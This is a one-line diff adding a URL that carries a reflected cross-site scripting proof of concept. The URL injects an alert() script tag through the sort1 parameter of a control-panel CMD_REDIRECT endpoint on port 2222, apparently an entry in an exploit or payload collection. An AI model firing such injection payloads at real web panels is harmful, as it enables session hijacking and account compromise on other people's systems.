@@ -1,0 +1,1 @@
+http://www.example.com:2222/CMD_REDIRECT?view=advanced&sort1%22%3E%3Cscript%3Ealert(111);%3C/script%3E=1&domain=www.example2.com
